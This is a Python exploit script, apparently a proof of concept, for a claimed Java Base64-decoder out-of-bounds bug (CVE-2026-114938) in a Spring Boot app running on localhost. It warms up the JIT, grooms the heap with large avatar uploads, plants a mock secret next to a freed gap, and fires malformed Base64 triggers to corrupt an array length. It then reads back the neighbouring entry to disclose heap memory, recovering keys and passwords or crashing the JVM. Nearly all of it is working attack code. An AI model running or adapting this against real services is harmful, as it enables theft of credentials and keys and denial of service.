#!/usr/bin/env python3
"""Spring Boot real-app escalation: CVE-2026-114938 OOB → corrupted length → heap disclosure.
Targets the decode→cache→GET surface (java.util.Base64.getDecoder, Spring/Tomcat default config).
"""
import sys, time, urllib.request, urllib.error

BASE = "http://127.0.0.1:8080"
HDR = {"X-User": "demo", "Content-Type": "application/octet-stream"}
K = 1747616          # 4k ≡ 0 (mod 64) → stub final-bit r<4 (bug path)

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=HDR)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return -1, str(e).encode(), {}

def pad_body(tail):
    # fill/trigger decoded lengths land object in 5 regions (5242861 / 5242849..50)
    k = 1747620 if tail == "AB" else 1747616
    return (("A" * (4 * k)) + tail).encode("latin-1")

def alive():
    return req("GET", "/api/status", timeout=5)[0] == 200

print("═══ Spring real-app escalation (CVE-2026-114938) ═══", flush=True)
for _ in range(60):
    if alive(): break
    time.sleep(2)
print("[0]", req("GET", "/api/status")[1].decode().strip(), flush=True)

# [W] warmup — decode0 must reach tier4 for the intrinsic (20K mixed shapes, tiny bodies)
shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A" * 4096 + b"AB",
          b"A" * 4096 + b"ABC", b"A" * 4096 + b"AB=="]
import base64 as b64mod
print("[W] warmup decode0 20K...", flush=True)
for i in range(20000):
    body = b64mod.b64encode(shapes[i & 3])
    code, _, hdrs = req("POST", "/api/avatar?id=w&x=1", body)
    if code == 201:
        req("DELETE", "/api/avatar?id=w")
print("[W] warmup done", flush=True)

# plant the "secret" humongous entry between fills (models any live secret adjacent
# to the corrupted array — Keycloak demo recovered a realm key from disclosed heap)
SECRET = (b"CLASSIFIED-ROOT-KEY=A7f3c9e1d2b8a6405f7c2e91d4b6a830 "
          b"DB-PASSWORD=hunter2-special-session "
          + b"\x00" * (5 * 1024 * 1024 - 96))
SECRET = SECRET[:96] + b"X" * (5 * 1024 * 1024 - 96)

fill = pad_body("AB")
trig = pad_body("==")
body_f = b64mod.b64encode(fill)
body_t = b64mod.b64encode(trig)
print("[1] fill=%dB trig=%dB" % (len(body_f), len(body_t)), flush=True)

# fills f0..f69 (gap source), cred (secret, adjacent after gap), f71..f139
def putfid(i, body):
    code, _, h = req("POST", "/api/avatar?id=f%d" % i, body)
    return code

for i in list(range(0, 70)):
    if putfid(i, body_f) != 200:
        print("[2] fill %d FAILED" % i, flush=True); sys.exit(1)
code, _, _ = req("POST", "/api/avatar?id=cred", b64mod.b64encode(SECRET))
print("[2] cred planted:", code, flush=True)
for i in range(71, 100):
    if putfid(i, body_f) != 200:
        print("[2] fill %d FAILED" % i, flush=True); sys.exit(1)
print("[2] fills done:", req("GET", "/api/status")[1].decode().strip(), flush=True)

# drop f69 → 5-region gap; neighbor = cred
req("DELETE", "/api/avatar?id=f69")
print("[4] dropped f69 (gap; neighbor = cred)", flush=True)
for _ in range(90):
    code, _, _ = req("POST", "/api/pump?mb=64")
    if code != 200: break
    # drive cycles; continue regardless (gap reclaim is best-effort)
    time.sleep(2)
    if req("GET", "/api/status", timeout=5)[0] != 200:
        print("★★★ JVM DEAD during cycle wait ★★★", flush=True)
        print("VERDICT: CRASH", flush=True); sys.exit(42)

# trigger ×3 (each may corrupt cred's header; shapes pad2 then pad1)
verdict_done = False
for t in range(1, 4):
    tail = "==" if t != 3 else "="
    body_t = b64mod.b64encode((("A" * (4 * K)) + tail).encode("latin-1"))
    code, body, _ = req("POST", "/api/avatar?id=trig%d" % t, body_t)
    print("[6] trigger %d (%s) -> HTTP %s %s" % (t, tail, code, body[:80]), flush=True)
    if not alive():
        print("★★★ JVM DEAD after trigger %d ★★★" % t, flush=True)
        print("VERDICT: CRASH", flush=True); sys.exit(42)
    time.sleep(3)

# disclosure attempt — GET cred (corrupted header → huge length → heap dump in response)
print("[7] disclosure attempt: GET cred", flush=True)
code, data, hdrs = req("GET", "/api/avatar?id=cred", timeout=120)
n = len(data)
expected = 5 * 1024 * 1024
print("[7] GET cred -> HTTP %s, body=%d bytes (expected %d), X-Cached-Len=%s"
      % (code, n, expected, hdrs.get("X-Cached-Len")), flush=True)
if n > expected + 4096:
    marker = data.find(b"CLASSIFIED-ROOT-KEY")
    print("[7] DISCLOSED +%d bytes; CLASSIFIED-ROOT-KEY at offset %s"
          % (n - expected, marker), flush=True)
    open("/tmp/disclosure.bin", "wb").write(data)
    if marker >= 0:
        print("[7] recovered: " + data[marker:marker + 96].decode("latin-1", "replace"), flush=True)
    print("VERDICT: DISCLOSED (heap memory beyond the corrupted array returned to attacker)", flush=True)
    sys.exit(43)
if code != 200:
    print("[7] cred read failed — corrupted header broke the app path (negative length likely)", flush=True)
print("VERDICT: NO-DISCLOSURE (corrupted length not in positive phase this run)", flush=True)
sys.exit(0)
